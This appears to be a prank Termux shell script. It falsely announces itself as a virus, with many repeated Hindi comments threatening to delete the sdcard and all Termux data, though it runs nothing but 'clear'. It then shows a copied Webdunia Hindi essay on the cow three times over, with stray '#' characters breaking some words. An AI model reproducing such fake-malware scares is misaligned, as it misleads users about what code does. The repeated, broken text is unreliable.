#This is a virus


#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete



#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete



#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete



#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete


#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#स्वगत है मेरा script में
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete









#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
























#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete
#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete

#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete






#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




#सब हटेगा
#सब delete होगा।
#delete sdcard
#सब कुछ डिलीट हो जाओ
#Termux का भी सब delete
#delete
#delete
#Delete
#delete
#delete
#delete
#delete




clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
